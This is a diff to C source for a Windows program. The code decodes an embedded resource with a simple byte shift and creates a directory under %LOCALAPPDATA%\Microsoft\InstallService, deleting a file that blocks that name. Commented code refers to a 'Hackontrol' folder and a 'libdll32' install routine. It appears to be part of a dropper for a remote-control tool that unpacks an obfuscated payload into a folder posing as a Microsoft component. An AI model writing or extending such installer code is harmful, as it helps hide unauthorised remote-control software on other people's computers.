@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <Windows.h>
+#include <ShlObj_core.h>
 #include "resource.h"
 
 #define PATH L"%LOCALAPPDATA%\\Microsoft\\InstallService"
@@ -121,6 +122,39 @@ int main(int argc, char** argv) {
 		buffer[length] = (data[length] - 18) % 0xFF;
 	}
 
+	printf("Create directory\n");
+	length = SHCreateDirectoryExW(NULL, pathHome, NULL);
+
+	if(length == ERROR_ALREADY_EXISTS || length == ERROR_FILE_EXISTS) {
+		length = GetFileAttributesW(pathHome);
+
+		if(length == INVALID_FILE_ATTRIBUTES) {
+			displayError(L"GetFileAttributesW", GetLastError(), heap);
+			goto freeBuffer;
+		}
+
+		if(length & FILE_ATTRIBUTE_DIRECTORY) {
+			goto directoryExists;
+		}
+
+		printf("Directory name conflict\n");
+
+		if(!DeleteFileW(pathHome)) {
+			displayError(L"DeleteFileW", GetLastError(), heap);
+			goto freeBuffer;
+		}
+
+		length = SHCreateDirectoryExW(NULL, pathHome, NULL);
+
+		if(length != ERROR_SUCCESS) {
+			displayError(L"SHCreateDirectoryExW", length, heap);
+			goto freeBuffer;
+		}
+	} else if(length != ERROR_SUCCESS) {
+		displayError(L"SHCreateDirectoryExW", length, heap);
+		goto freeBuffer;
+	}
+directoryExists:
 	printf("Finished\n");
 	codeExit = 0;
 freeBuffer:
@@ -133,13 +167,6 @@ freePathHome:
 /*#define FUNCTION_LIBDLL32 "Install"
 
 int main(int argc, char** argv) {
-	if(!HackontrolCreateDirectory(folderHackontrol)) {
-		KHOPANLASTERRORMESSAGE_WIN32(L"HackontrolCreateDirectory");
-		LocalFree(folderHackontrol);
-		LocalFree(buffer);
-		return 1;
-	}
-
 	LPWSTR fileLibdll32 = KHOPANFormatMessage(L"%ws\\" FILE_LIBDLL32, folderHackontrol);
 	error = GetLastError();
 	LocalFree(folderHackontrol);
